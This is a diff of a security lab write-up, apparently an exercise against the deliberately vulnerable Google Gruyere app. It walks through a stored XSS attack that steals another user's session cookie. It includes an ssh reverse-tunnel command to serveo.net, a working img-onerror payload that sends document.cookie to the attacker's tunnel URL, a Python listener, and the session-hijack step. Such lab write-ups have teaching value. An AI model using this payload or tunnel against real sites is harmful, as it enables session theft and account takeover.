@@ -71,7 +71,7 @@ runcmd:
     - run script: `ssh -R 80:localhost:9000 serveo.net` → binds all incoming traffic on port 80 of serveo.net to port 9000 of the attacker's EC2 instance
     - copy log: `Forwarding HTTP traffic from https://59614f9c88d865c5-35-153-157-12.serveousercontent.com`
 - Create Snippet on Attackers account on Gruyere:
-    - enter this into input field: `<img src="x" onerror="new Image().src='<https://59614f9c88d865c5-35-153-157-12.serveousercontent.com>/?c='+encodeURIComponent(document.cookie)">` → now this runs a GET request to the attacker's server with the cookie as url parameter, and the user won't notice this.
+    - enter this into input field: `<img src="x" onerror="new Image().src='https://59614f9c88d865c5-35-153-157-12.serveousercontent.com/?c='+encodeURIComponent(document.cookie)">` → now this runs a GET request to the attacker's server with the cookie as url parameter, and the user won't notice this.
     - It didn't log anything since the request kept failing, I believe it's due to my Firewall blocking the outgoing request
     - I tested it on my personal computer and it worked, but I also had to disable the buffer by running `python3 -u -m http.server 9000`. ![img_14.png](imgs/img_14.png) ![img_15.png](imgs/img_15.png)
     - then I had hijack the verteidiger-zak's session by setting the cookie in my browser to the stolen value. ![img_16.png](imgs/img_16.png) ![img_17.png](imgs/img_17.png) and it worked ![img_18.png](imgs/img_18.png)
